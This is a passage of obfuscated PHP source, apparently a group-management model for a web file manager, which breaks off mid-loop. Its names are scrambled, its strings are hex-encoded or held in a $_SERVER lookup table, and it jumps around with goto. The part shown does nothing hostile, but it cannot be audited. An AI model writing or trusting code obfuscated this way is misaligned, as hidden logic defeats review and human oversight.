$f«­ÍÅÃŒ÷ < $FÉˆø‹Ğ†¶; $f«­ÍÅÃŒ÷ = $f«­ÍÅÃŒ÷ + $cÜŞ¨»£±½) { $fğ°³ƒ…‹ = $this->limit($f«­ÍÅÃŒ÷, $f«­ÍÅÃŒ÷ + $cÜŞ¨»£±½)->select(); foreach ($fğ°³ƒ…‹ as $EË˜™…²Š—) { $eã‡ãØˆŒ += $EË˜™…²Š—[$d³¹ØŠ®‘©[77]] * $EË˜™…²Š—[$d³¹ØŠ®‘©[2129]]; $a¤ß¨±È¾¢ += $EË˜™…²Š—[$d³¹ØŠ®‘©[77]] * ($EË˜™…²Š—[$d³¹ØŠ®‘©[2129]] - 1); $C¡İÈ§õå += $EË˜™…²Š—[$d³¹ØŠ®‘©[2129]]; } } $cä’˜å¨ÁÙ = array($d³¹ØŠ®‘©[2134] => $eã‡ãØˆŒ, $d³¹ØŠ®‘©[2135] => $a¤ß¨±È¾¢, $d³¹ØŠ®‘©[2136] => $a¤ß¨±È¾¢ / $eã‡ãØˆŒ, $d³¹ØŠ®‘©[81] => $FÉˆø‹Ğ†¶, $d³¹ØŠ®‘©[2137] => $C¡İÈ§õå); return $cä’˜å¨ÁÙ; goto FÚóÌÄˆÔ‡; FÚóÌÄˆÔ‡: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\154\145\116\141\x6d\145" => "\x67\162\x6f\165\x70\137\x6d\145\164\x61", "\x6d\x65\x74\141\x46\x69\145\154\x64" => "\147\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($F“„½éîÎ) { $dáÕ—íˆˆŸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($dáÕ—íˆˆŸ[2138] => array($F“„½éîÎ[0], $dáÕ—íˆˆŸ[2139]), $dáÕ—íˆˆŸ[2140] => array($F“„½éîÎ[0], $dáÕ—íˆˆŸ[2139])); } protected function getInfo($D‹÷ÑæâÑ®) { $a¸Î‚Öœ¥ = $this->getInfoSimple($D‹÷ÑæâÑ®); if (!$a¸Î‚Öœ¥) { return !1; } return $this->_listDataApplyItem($a¸Î‚Öœ¥); } protected function getInfoSimple($E¬ÈğÍŞÎ, $f¡ØäÆ›Ø  = false) { $A¾Õ«¨÷ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($f¡ØäÆ›Ø ) { $Bš»„•ºÇù = array($A¾Õ«¨÷ù[2072] => intval($E¬ÈğÍŞÎ)); $f‡³ì©ˆŞÄ = $this->where($Bš»„•ºÇù)->find(); return is_array($f‡³ì©ˆŞÄ) ? $f‡³ì©ˆŞÄ : array(); } return $this->cacheFunctionGet($A¾Õ«¨÷ù[2141], $E¬ÈğÍŞÎ); } protected function groupAdd($b‰İÂ»’‹¸) { goto cÓÌƒ¥³Ğ ; bÜÈÊØ×ƒŒ: if ($AÍ©¥‰ƒóô[$D²¿Àè†»Ò[455]]) { $A˜†³ñ»îª = $AÍ©¥‰ƒóô[$D²¿Àè†»Ò[455]] . $AÍ©¥‰ƒóô[$D²¿Àè†»Ò[2072]] . $D²¿Àè†»Ò[47]; } $F†ğÎ ˆÍœ = array($D²¿Àè†»Ò[383] => $this->groupNameAuto($b‰İÂ»’‹¸[$D²¿Àè†»Ò[457]], $b‰İÂ»’‹¸[$D²¿Àè†»Ò[28]]), $D²¿Àè†»Ò[365] => $b‰İÂ»’‹¸[$D²¿Àè†»Ò[457]], $D²¿Àè†»Ò[521] => $A˜†³ñ»îª, $D²¿Àè†»Ò[2142] => $b‰İÂ»’‹¸[$D²¿Àè†»Ò[2056]], $D²¿Àè†»Ò[2143] => 0, $D²¿Àè†»Ò[2076] => 0); if (!empty($b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]])) { $F†ğÎ ˆÍœ[$D²¿Àè†»Ò[2072]] = $b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]]; } goto Aù‡Å¹Âå; cÓÌƒ¥³Ğ : $D²¿Àè†»Ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$b‰İÂ»’‹¸[$D²¿Àè†»Ò[457]] && isset($b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]]) && $b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]] == 1) { if ($AÍ©¥‰ƒóô = $this->getInfoSimple($b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]], !0)) { return $b‰İÂ»’‹¸[$D²¿Àè†»Ò[2072]]; } } else { $AÍ©¥‰ƒóô = $this->getInfoSimple($b‰İÂ»’‹¸[$D²¿Àè†»Ò[457]]); if (!$AÍ©¥‰ƒóô) { return !1; } } $A˜†³ñ»îª = $D²¿Àè†»Ò[466]; goto bÜÈÊØ×ƒŒ; F –¨—«ƒè: return $A¿ŠÈ»¾è×; goto d‡Ìæêë«½; Aù‡Å¹Âå: $A¿ŠÈ»¾è× = $this->add($F†ğÎ ˆÍœ); $this->setNamePinyin($A¿ŠÈ»¾è×, $F†ğÎ ˆÍœ[$D²¿Àè†»Ò[28]]); Model($D²¿Àè†»Ò[1102])->groupRootAdd($A¿ŠÈ»¾è×); goto F –¨—«ƒè; d‡Ìæêë«½: } protected function groupEdit($B¸½Ñ£ÃØ¡, $d³Ï÷‹´Î») { $däÌĞî»³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($d³Ï÷‹´Î»[$däÌĞî»³[457]])) { $CÎ¾¼¾¸‚ = $this->getInfoSimple($B¸½Ñ£ÃØ¡); $fªñÇ­¢¨§ = $this->getInfoSimple($d³Ï÷‹´Î»[$däÌĞî»³[457]]); if (!$CÎ¾¼¾¸‚ || !$fªñÇ­¢¨§) { return !1; } if ($CÎ¾¼¾¸‚[$däÌĞî»³[2072]] == $fªñÇ­¢¨§[$däÌĞî»³[2072]]) { return !1; } if ($d³Ï÷‹´Î»[$däÌĞî»³[457]] != $CÎ¾¼¾¸‚[$däÌĞî»³[457]]) { if ($fªñÇ­¢¨§[$däÌĞî»³[455]] !== $CÎ¾¼¾¸‚[$däÌĞî»³[455]] && strpos($fªñÇ­¢¨§[$däÌĞî»³[455]], $CÎ¾¼¾¸‚[$däÌĞî»³[455]] . $CÎ¾¼¾¸‚[$däÌĞî»³[2072]] . $däÌĞî»³[47]) === 0) { return !1; } $d³Ï÷‹´Î»[$däÌĞî»³[521]] = $fªñÇ­¢¨§[$däÌĞî»³[455]] . $d³Ï÷‹´Î»[$däÌĞî»³[457]] . $däÌĞî»³[47]; $this->_changeChildLevel($CÎ¾¼¾¸‚, $fªñÇ­¢¨§); } } if (isset($d³Ï÷‹´Î»[$däÌĞî»³[28]])) { $this->setNamePinyin($B¸½Ñ£ÃØ¡, $d³Ï÷‹´Î»[$däÌĞî»³[28]]); } return $this->where(array($däÌĞî»³[2144] => $B¸½Ñ£ÃØ¡))->save($d³Ï÷‹´Î»); } private function _changeChildLevel($a¥§¼¹Š, $cĞÈÏ÷¨, $Féïåª¢¼é = false) { goto AÍæ¬ªÁ¦‚; A”çÆ“ò²Ä: $this->where($F ‹ëÅË‰)->data($aá¬‰£¸Š¨)->save(); goto AÛóÌŠ¸ùã; AÍæ¬ªÁ¦‚: $DëÛóÊØÊ‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÏ›õëùÁ¿ = $a¥§¼¹Š[$DëÛóÊØÊ‹[455]] . $a¥§¼¹Š[$DëÛóÊØÊ‹[2072]] . $DëÛóÊØÊ‹[47]; $d×ÒÇ®× = $cĞÈÏ÷¨[$DëÛóÊØÊ‹[455]] . $cĞÈÏ÷¨[$DëÛóÊØÊ‹[2072]] . $DëÛóÊØÊ‹[47] . $a¥§¼¹Š[$DëÛóÊØÊ‹[2072]] . $DëÛóÊØÊ‹[47]; goto aÙšµîÂ²¸; aÙšµîÂ²¸: if ($Féïåª¢¼é) { $d×ÒÇ®× = $cĞÈÏ÷¨[$DëÛóÊØÊ‹[455]] . $cĞÈÏ÷¨[$DëÛóÊØÊ‹[2072]] . $DëÛóÊØÊ‹[47]; } $F ‹ëÅË‰ = array($DëÛóÊØÊ‹[521] => array($DëÛóÊØÊ‹[479], $a¥§¼¹Š[$DëÛóÊØÊ‹[455]] . $a¥§¼¹Š[$DëÛóÊØÊ‹[2072]] . $DëÛóÊØÊ‹[480])); $aá¬‰£¸Š¨ = array($DëÛóÊØÊ‹[521] => array($DëÛóÊØÊ‹[530], "\162\x65\160\x6c\141\x63\x65\x28\160\x61\162\145\x6e\164\x4c\x65\166\145\154\x2c\47{$dÏ›õëùÁ¿}\x27\x2c\x27{$d×ÒÇ®×}\x27\x29")); goto A”çÆ“ò²Ä; AÛóÌŠ¸ùã: } public function setNamePinyin($d«çºƒ‹…, $fô¤ç–†íŠ = false) { $c¿ºœóãµâ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$fô¤ç–†íŠ) { $d§ØõÀÕË = $this->getInfoSimple($d«çºƒ‹…); $fô¤ç–†íŠ = $d§ØõÀÕË[$c¿ºœóãµâ[28]]; } if (!Input::check($fô¤ç–†íŠ, $c¿ºœóãµâ[524])) { $this->metaSet($d«çºƒ‹…, $c¿ºœóãµâ[412], null); $this->metaSet($d«çºƒ‹…, $c¿ºœóãµâ[411], null); return; } $BÕÃ¸£ƒ¿Ñ = array($c¿ºœóãµâ[412] => str_replace($c¿ºœóãµâ[50], $c¿ºœóãµâ[33], Pinyin::encode($fô¤ç–†íŠ)), $c¿ºœóãµâ[411] => Pinyin::encode($fô¤ç–†íŠ, $c¿ºœóãµâ[525])); $this->metaSet($d«çºƒ‹…, $BÕÃ¸£ƒ¿Ñ); } protected function groupRemove($BæùâˆÀÈ‘) { goto Dò²¡°É“Ú; dİ„Áèôãù: if (!$CäâŒˆŸô || $CäâŒˆŸô[$eÂ¶ŒÅ‘Î°[457]] == 0) { return !1; } $dÉºÕ¦—à± = $this->getInfoSimple($CäâŒˆŸô[$eÂ¶ŒÅ‘Î°[457]]); $this->_changeChildLevel($CäâŒˆŸô, $dÉºÕ¦—à±, !0); goto EÏÁÌ‘ÙÌ; Dò²¡°É“Ú: $eÂ¶ŒÅ‘Î° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eõ—Û§š…„ = array($eÂ¶ŒÅ‘Î°[2072] => $BæùâˆÀÈ‘); $CäâŒˆŸô = $this->where($eõ—Û§š…„)->find(); goto dİ„Áèôãù; cˆ°’²²›Ò: Model($eÂ¶ŒÅ‘Î°[747])->groupRootRemove($BæùâˆÀÈ‘); return $this->where($eõ—Û§š…„)->delete(); goto dãòÀÅ»—¤; EÏÁÌ‘ÙÌ: $this->where(array($eÂ¶ŒÅ‘Î°[457] => $BæùâˆÀÈ‘))->save(array($eÂ¶ŒÅ‘Î°[457] => $CäâŒˆŸô[$eÂ¶ŒÅ‘Î°[457]])); Model($eÂ¶ŒÅ‘Î°[2145])->where($eõ—Û§š…„)->delete(); Model($eÂ¶ŒÅ‘Î°[2146])->where($eõ—Û§š…„)->delete(); goto cˆ°’²²›Ò; dãòÀÅ»—¤: } public function listData() { $aÙ¾°¿†”– = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aÙ¾°¿†”–[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]]); return $aÙ¾°¿†”–; } private function _makeOrder($Aâä¸ªóù = '') { goto cêâ¶ÀÊ¸‚; cêâ¶ÀÊ¸‚: $Eï—Ü§¨‰ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a“ª‡¼¤ë‡ = array($Eï—Ü§¨‰ã[2072], $Eï—Ü§¨‰ã[28], $Eï—Ü§¨‰ã[2058], $Eï—Ü§¨‰ã[184]); $a–ŞÜŒœç = array($Eï—Ü§¨‰ã[398] => $Eï—Ü§¨‰ã[399], $Eï—Ü§¨‰ã[400] => $Eï—Ü§¨‰ã[401]); goto FŞœ„”—ÖØ; FŞœ„”—ÖØ: $aÓÄòÈ¶ÇÖ = Input::get($Eï—Ü§¨‰ã[403], $Eï—Ü§¨‰ã[7], $Eï—Ü§¨‰ã[2144], $a“ª‡¼¤ë‡); $Bºë×Üé’ = Input::get($Eï—Ü§¨‰ã[404], $Eï—Ü§¨‰ã[7], $Eï—Ü§¨‰ã[2147], array($Eï—Ü§¨‰ã[2147], $Eï—Ü§¨‰ã[400])); $Bºë×Üé’ = $a–ŞÜŒœç[$Bºë×Üé’]; goto b§Ïî±ÑŸÌ; b§Ïî±ÑŸÌ: $Aâä¸ªóù = $Aâä¸ªóù . "{$aÓÄòÈ¶ÇÖ}\40{$Bºë×Üé’}\54\x20\147\x72\x6f\165\160\x49\x44\x20\141\x73\x63"; return $this->order($Aâä¸ªóù); goto EˆöˆóñÂ±; EˆöˆóñÂ±: } public function listChild($B«”ÄÎÊ‡î) { $C‡Äï´–Ö¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b–£¹ª¤— = $this->where(array($C‡Äï´–Ö¸[457] => $B«”ÄÎÊ‡î))->_makeOrder()->selectPage(200); $this->_listDataApply($b–£¹ª¤—[$C‡Äï´–Ö¸[351]]); return $b–£¹ª¤—; } public function listByID($fß†Š”é) { $Fºô£‚¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$fß†Š”é) { return array(); } $cŞå¾±èá´ = array($Fºô£‚¾[2072] => array($Fºô£‚¾[7], $fß†Š”é)); $E“æÈËÃÑÓ = $this->where($cŞå¾±èá´)->select(); $this->_listDataApply($E“æÈËÃÑÓ); return $E“æÈËÃÑÓ; } public function listSearch($e«Îî—ÈÎË) { goto eëá÷ì…î; b­‡•ŸêÍ: $this->_listDataApply($aøòË¬‡»¶[$A¯ƒ‡¡æŒ[351]]); return $aøòË¬‡»¶; goto AË¾¤Ã”ÒÅ; fÄ‚ß·À: if (!trim($C‰ÑåŞ¾Õ˜)) { return !1; } $C‰ÑåŞ¾Õ˜ = str_replace($A¯ƒ‡¡æŒ[2150], $A¯ƒ‡¡æŒ[2151], $C‰ÑåŞ¾Õ˜); $e­¿šÏÑ™ = array($A¯ƒ‡¡æŒ[2072] => array($A¯ƒ‡¡æŒ[746], "\x25{$C‰ÑåŞ¾Õ˜}\45"), $A¯ƒ‡¡æŒ[28] => array($A¯ƒ‡¡æŒ[746], "\45{$C‰ÑåŞ¾Õ˜}\45"), $A¯ƒ‡¡æŒ[908] => $A¯ƒ‡¡æŒ[2152]); goto bö†»’¼‹ê; eëá÷ì…î: $A¯ƒ‡¡æŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C‰ÑåŞ¾Õ˜ = $e«Îî—ÈÎË[$A¯ƒ‡¡æŒ[2148]]; $E´—º†»ëã = isset($e«Îî—ÈÎË[$A¯ƒ‡¡æŒ[2149]]) ? $e«Îî—ÈÎË[$A¯ƒ‡¡æŒ[2149]] : !1; goto fÄ‚ß·À; bö†»’¼‹ê: $aøòË¬‡»¶ = $this->_makeOrder()->where($e­¿šÏÑ™)->selectPage(20); $aøòË¬‡»¶ = $aøòË¬‡»¶ ? $aøòË¬‡»¶ : array(); if (!$aøòË¬‡»¶ || count($aøòË¬‡»¶[$A¯ƒ‡¡æŒ[351]]) < 5 && Input::check($C‰ÑåŞ¾Õ˜, $A¯ƒ‡¡æŒ[303])) { $AÑ¦„„Æ ¶ = $this->_searchFromMeta($A¯ƒ‡¡æŒ[411], $C‰ÑåŞ¾Õ˜, 10); $AÉŒå‰¢ß„ = $this->_searchFromMeta($A¯ƒ‡¡æŒ[412], $C‰ÑåŞ¾Õ˜, 10); $A½¦äµˆ»ë = array_merge($AÑ¦„„Æ ¶, $AÉŒå‰¢ß„, $aøòË¬‡»¶[$A¯ƒ‡¡æŒ[351]]); $aøòË¬‡»¶[$A¯ƒ‡¡æŒ[351]] = array_unique_by_key($A½¦äµˆ»ë, $A¯ƒ‡¡æŒ[2072]); $aøòË¬‡»¶[$A¯ƒ‡¡æŒ[348]][$A¯ƒ‡¡æŒ[349]] = count($aøòË¬‡»¶[$A¯ƒ‡¡æŒ[351]]); $aøòË¬‡»¶[$A¯ƒ‡¡æŒ[348]][$A¯ƒ‡¡æŒ[350]] = ceil($aøòË¬‡»¶[$A¯ƒ‡¡æŒ[348]][$A¯ƒ‡¡æŒ[349]] / $aøòË¬‡»¶[$A¯ƒ‡¡æŒ[348]][$A¯ƒ‡¡æŒ[346]]); } goto b­‡•ŸêÍ; AË¾¤Ã”ÒÅ: } private function _searchFromMeta($D˜×Äçƒ», $EËÈãåá©, $d­ªãÌĞÔ) { goto d‚Ç–ÓÔ¼; fªì±Ôˆ„ğ: $f»¦òº¶ø÷ = $this->where(array($bŒßùÖËâ…[2144] => array($bŒßùÖËâ…[7], $fŒåïÊÆÓ¥)))->select(); if (!$f»¦òº¶ø÷) { return array(); } return $f»¦òº¶ø÷; goto fïÍ½‰Ã¨‰; Aƒî†‚ˆ¯ö: $fŒåïÊÆÓ¥ = Model($bŒßùÖËâ…[2153])->where($C»Ù½º‰‡‰)->limit($d­ªãÌĞÔ)->select(); if (!$fŒåïÊÆÓ¥) { return array(); } $fŒåïÊÆÓ¥ = array_to_keyvalue($fŒåïÊÆÓ¥, $bŒßùÖËâ…[33], $bŒßùÖËâ…[2072]); goto fªì±Ôˆ„ğ; d‚Ç–ÓÔ¼: $bŒßùÖËâ… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EËÈãåá© = strtolower($EËÈãåá©); $C»Ù½º‰‡‰ = array($bŒßùÖËâ…[89] => $D˜×Äçƒ», $bŒßùÖËâ…[356] => array($bŒßùÖËâ…[746], "\x25{$EËÈãåá©}\45")); goto Aƒî†‚ˆ¯ö; fïÍ½‰Ã¨‰: } protected function _listDataApplyItem($F¦®îŸÈ) { $a¡’âŠÌ» = array($F¦®îŸÈ); $this->_listDataApply($a¡’âŠÌ»); return $a¡’âŠÌ»[0]; } protected function _listDataApply(&$F»ÃË§äÍ‹) { goto bÄŠ²ƒ®‰ ; BèÙ©†Å˜: $this->_listAppendParent($F»ÃË§äÍ‹); $this->_listAppendSourceRoot($F»ÃË§äÍ‹, $a˜¯šÚèÆ); goto EÈÎ©—á¯; bÛä¹†¼: $this->_listAppendChildren($F»ÃË§äÍ‹); $this->_listAppendChildrenMember($F»ÃË§äÍ‹); $this->_listAppendMeta($F»ÃË§äÍ‹, $a˜¯šÚèÆ); goto BèÙ©†Å˜; bÄŠ²ƒ®‰ : $fË”´Ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F»ÃË§äÍ‹) { return; } $a˜¯šÚèÆ = array_to_keyvalue($F»ÃË§äÍ‹, $fË”´Ç[33], $fË”´Ç[2072]); goto bÛä¹†¼; EÈÎ©—á¯: } private function _listAppendChildren(&$dÕ˜³¨Ëá) { goto Fæ¶ğºöÆ»; CŠ˜ããà: $A­åŒ´‰Ì‘ = count($dÕ˜³¨Ëá); $cŞ‹÷ò» = $this->tablePrefix . $this->tableName; for ($FïÊà™šÑ = 0, $CŠå‘êÊ¹ = 0; $FïÊà™šÑ < $A­åŒ´‰Ì‘; $FïÊà™šÑ++) { $CŠå‘êÊ¹++; $CëÉ–ÊŞª = $dÕ˜³¨Ëá[$FïÊà™šÑ][$bËâ»Ê[2072]]; $e¨œº„è‚ˆ .= "\123\x45\x4c\105\x43\x54\x20\x2a\40\106\x52\x4f\x4d\40\50\x53\x45\114\x45\103\124\40\47{$CëÉ–ÊŞª}\137\143\x68\x69\154\144\47\x20\141\x73\40\x68\141\163\40\106\122\x4f\115\x20\x60{$cŞ‹÷ò»}\140\40\x77\150\x65\x72\x65\40\160\x61\x72\x65\x6e\x74\x49\104\75{$CëÉ–ÊŞª}\x20\x6c\x69\155\x69\164\40\61\51\40\x61\x73\40\164\x62\x5f{$CëÉ–ÊŞª}\40\x75\156\x69\157\x6e\40\141\x6c\x6c\x20"; if (($CŠå‘êÊ¹ >= 20 || $FïÊà™šÑ == $A­åŒ´‰Ì‘ - 1) && $e¨œº„è‚ˆ) { $e¨œº„è‚ˆ = substr($e¨œº„è‚ˆ, 0, -strlen($bËâ»Ê[445])); $Eª‰Ìê¦ = $this->query($e¨œº„è‚ˆ); $b÷¾ï…ƒˆ = array_merge($b÷¾ï…ƒˆ, $Eª‰Ìê¦); $CŠå‘êÊ¹ = 0; $e¨œº„è‚ˆ = $bËâ»Ê[33]; } } goto AÆ‹œêµ; Fæ¶ğºöÆ»: $bËâ»Ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¨œº„è‚ˆ = $bËâ»Ê[358]; $b÷¾ï…ƒˆ = array(); goto CŠ˜ããà; AÆ‹œêµ: $b÷¾ï…ƒˆ = array_to_keyvalue($b÷¾ï…ƒˆ, $bËâ»Ê[446]); foreach ($dÕ˜³¨Ëá as &$cé‡®÷Ôª÷) { $cé‡®÷Ôª÷[$bËâ»Ê[2154]] = isset($b÷¾ï…ƒˆ[$cé‡®÷Ôª÷[$bËâ»Ê[2072]] . $bËâ»Ê[2155]]); } goto BÆ¨ÎÔ·§; BÆ¨ÎÔ·§: } private function _listAppendChildrenMember(&$cñÂ—²Ê¼è) { goto D…ã‹½Øˆ; c²ĞàîÄœŒ: $Aİ¨›ãóŠå = count($cñÂ—²Ê¼è); $cœÉ‹­÷¾ = $this->tablePrefix . $a «¦îÔ²á[2146]; for ($aÆàÎÃŸÌ = 0, $D¼ÚÚŒô‹ = 0; $aÆàÎÃŸÌ < $Aİ¨›ãóŠå; $aÆàÎÃŸÌ++) { $D¼ÚÚŒô‹++; $BğÚÑï‡¸‰ = $cñÂ—²Ê¼è[$aÆàÎÃŸÌ][$a «¦îÔ²á[2072]]; $B¯ˆÊ‘Ç°Ğ .= "\x53\105\x4c\105\x43\124\x20\x2a\40\x46\122\117\x4d\x20\50\x53\x45\x4c\105\103\124\40\47{$BğÚÑï‡¸‰}\x5f\143\150\151\154\144\x27\40\141\x73\x20\x68\x61\163\x20\106\x52\117\x4d\x20\x60{$cœÉ‹­÷¾}\x60\40\x77\x68\145\x72\x65\40\147\x72\157\x75\160\x49\104\x3d{$BğÚÑï‡¸‰}\40\x6c\x69\x6d\x69\164\40\61\51\40\x61\163\40\x74\142\x5f{$BğÚÑï‡¸‰}\40\x75\156\x69\x6f\x6e\x20\x61\x6c\x6c\x20"; if (($D¼ÚÚŒô‹ >= 20 || $aÆàÎÃŸÌ == $Aİ¨›ãóŠå - 1) && $B¯ˆÊ‘Ç°Ğ) { $B¯ˆÊ‘Ç°Ğ = substr($B¯ˆÊ‘Ç°Ğ, 0, -strlen($a «¦îÔ²á[445])); $DÁà ­‚¦÷ = $this->query($B¯ˆÊ‘Ç°Ğ); $CæìÈ›³÷ = array_merge($CæìÈ›³÷, $DÁà ­‚¦÷); $D¼ÚÚŒô‹ = 0; $B¯ˆÊ‘Ç°Ğ = $a «¦îÔ²á[33]; } } goto aó»Û·ñáÛ; D…ã‹½Øˆ: $a «¦îÔ²á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B¯ˆÊ‘Ç°Ğ = $a «¦îÔ²á[358]; $CæìÈ›³÷ = array(); goto c²ĞàîÄœŒ; aó»Û·ñáÛ: $CæìÈ›³÷ = array_to_keyvalue($CæìÈ›³÷, $a «¦îÔ²á[446]); foreach ($cñÂ—²Ê¼è as &$dÄ‚¤çØ›ò) { $dÄ‚¤çØ›ò[$a «¦îÔ²á[2156]] = isset($CæìÈ›³÷[$dÄ‚¤çØ›ò[$a «¦îÔ²á[2072]] . $a «¦îÔ²á[2155]]); } goto CÛ´µó·ÛÍ; CÛ´µó·ÛÍ: } private function _listAppendMeta(&$Cî’´ä­‹ô, $c©¿Õëµ’½) { $D—±¨Ú¬ÚÃ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AïøÅêØ¥² = array($D—±¨Ú¬ÚÃ[2072] => array($D—±¨Ú¬ÚÃ[7], $c©¿Õëµ’½)); $Cß·¹¼ƒò‡ = Model($D—±¨Ú¬ÚÃ[2145])->where($AïøÅêØ¥²)->select(); $Cß·¹¼ƒò‡ = array_to_keyvalue_group($Cß·¹¼ƒò‡, $D—±¨Ú¬ÚÃ[2072]); foreach ($Cß·¹¼ƒò‡ as &$B”¾²å­™Ê) { $B”¾²å­™Ê = array_to_keyvalue($B”¾²å­™Ê, $D—±¨Ú¬ÚÃ[89], $D—±¨Ú¬ÚÃ[356]); } foreach ($Cî’´ä­‹ô as &$eéèÕãÌ¹¨) { $eéèÕãÌ¹¨[$D—±¨Ú¬ÚÃ[413]] = array(); if (isset($Cß·¹¼ƒò‡[$eéèÕãÌ¹¨[$D—±¨Ú¬ÚÃ[2072]]])) { $eéèÕãÌ¹¨[$D—±¨Ú¬ÚÃ[413]] = $Cß·¹¼ƒò‡[$eéèÕãÌ¹¨[$D—±¨Ú¬ÚÃ[2072]]]; } } } protected function parentLevelArray($c™Ä Ó¥îé) { $CºãŒ–š†Œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c™Ä Ó¥îé = explode($CºãŒ–š†Œ[47], trim($c™Ä Ó¥îé, $CºãŒ–š†Œ[47])); $c™Ä Ó¥îé = array_remove_value($c™Ä Ó¥îé, $CºãŒ–š†Œ[464]); return $c™Ä Ó¥îé; } private function _listAppendParent(&$dÚ§†Ù“š¦) { goto A¡³õÒ£ÉÊ; a—ñÖ”›Áù: foreach ($dÚ§†Ù“š¦ as &$d±® Û°„) { $EÆÉ¢…ø‡ = $this->parentLevelArray($d±® Û°„[$dèÖó‰õé[455]]); $fòæÍ«‚– = $dèÖó‰õé[33]; foreach ($EÆÉ¢…ø‡ as $D°¥Á¨†ï) { $fòæÍ«‚– .= $FƒŞéŞ™¢Š[$D°¥Á¨†ï] . $dèÖó‰õé[8]; } if ($EÆÉ¢…ø‡) { $fòæÍ«‚– .= $d±® Û°„[$dèÖó‰õé[28]]; } $d±® Û°„[$dèÖó‰õé[459]] = str_replace($dèÖó‰õé[463], $dèÖó‰õé[8], $fòæÍ«‚–); } goto AÖ³’ßç«; C‘Œ¬ùƒ‰Ò: $bÇ¥›æ²©® = array(); foreach ($FƒŞéŞ™¢Š as $Eé‰áİÂÈ— => $aå•ÍÙ•÷—) { if (!$aå•ÍÙ•÷—) { $bÇ¥›æ²©®[] = $Eé‰áİÂÈ—; } } if ($bÇ¥›æ²©®) { $cãÎÑ‚Àé´ = array($dèÖó‰õé[2144] => array($dèÖó‰õé[381], $bÇ¥›æ²©®)); $AŠ’ğ¨Ûãæ = $this->field($dèÖó‰õé[2157])->where($cãÎÑ‚Àé´)->select(); $cì¿‹©„Ëë = array_to_keyvalue($AŠ’ğ¨Ûãæ, $dèÖó‰õé[2072], $dèÖó‰õé[28]); $FƒŞéŞ™¢Š = array_merge_index($FƒŞéŞ™¢Š, $cì¿‹©„Ëë); } goto a—ñÖ”›Áù; A¡³õÒ£ÉÊ: $dèÖó‰õé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FƒŞéŞ™¢Š = array(); foreach ($dÚ§†Ù“š¦ as &$d±® Û°„) { $FƒŞéŞ™¢Š[$d±® Û°„[$dèÖó‰õé[2072]]] = $d±® Û°„[$dèÖó‰õé[28]]; $EÆÉ¢…ø‡ = $this->parentLevelArray($d±® Û°„[$dèÖó‰õé[455]]); foreach ($EÆÉ¢…ø‡ as $D°¥Á¨†ï) { if (!isset($FƒŞéŞ™¢Š[$D°¥Á¨†ï])) { $FƒŞéŞ™¢Š[$D°¥Á¨†ï] = 0; } } } goto C‘Œ¬ùƒ‰Ò; AÖ³’ßç«: } private function _listAppendSourceRoot(&$BÓËÅõİ£¯, $bÓŒç©óÄ¨) { goto D‰¨…¢ñ¦; D¢‡ÁÛ«¸: foreach ($BÓËÅõİ£¯ as &$B”…Î§À¦„) { $B”…Î§À¦„[$e°Ê“¿•¹‚[388]] = $bé‚Ñ›Œ‹Á[$B”…Î§À¦„[$e°Ê“¿•¹‚[2072]]] ? $bé‚Ñ›Œ‹Á[$B”…Î§À¦„[$e°Ê“¿•¹‚[2072]]] : array(); } goto BŠ–¡àÀ÷; D‰¨…¢ñ¦: $e°Ê“¿•¹‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FˆÚ¢’‹Ş° = array($e°Ê“¿•¹‚[368] => SourceModel::TYPE_GROUP, $e°Ê“¿•¹‚[457] => 0, $e°Ê“¿•¹‚[452] => array($e°Ê“¿•¹‚[7], $bÓŒç©óÄ¨)); $fè‰á‹•…‘ = $e°Ê“¿•¹‚[2158]; goto bË…Ø¾Şó; bË…Ø¾Şó: $bé‚Ñ›Œ‹Á = Model($e°Ê“¿•¹‚[747])->order($e°Ê“¿•¹‚[2159])->field($fè‰á‹•…‘)->where($FˆÚ¢’‹Ş°)->select(); $bé‚Ñ›Œ‹Á = array_to_keyvalue($bé‚Ñ›Œ‹Á, $e°Ê“¿•¹‚[452]); $bé‚Ñ›Œ‹Á = array_remove_key($bé‚Ñ›Œ‹Á, $e°Ê“¿•¹‚[452]); goto D¢‡ÁÛ«¸; BŠ–¡àÀ÷: } protected function resetParentLevel() { $CËŒ ÃÚ´‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fğæµŒÆ š = $CËŒ ÃÚ´‡[2072]; $d—èßæé†³ = $this->select(); $d—èßæé†³ = array_to_keyvalue($d—èßæé†³, $fğæµŒÆ š); foreach ($d—èßæé†³ as $F¾ÌÖ™‡) { goto cºäâÍ•Ç‹; fˆ–¤ÅÜ“: $this->where(array($fğæµŒÆ š => $F¾ÌÖ™‡[$fğæµŒÆ š]))->save(array($CËŒ ÃÚ´‡[521] => $cä‡²Õ³„ƒ)); goto d²™˜šùí; cºäâÍ•Ç‹: $Bã‘¢ÍÒÅ« = $F¾ÌÖ™‡; $cä‡²Õ³„ƒ = array(); while 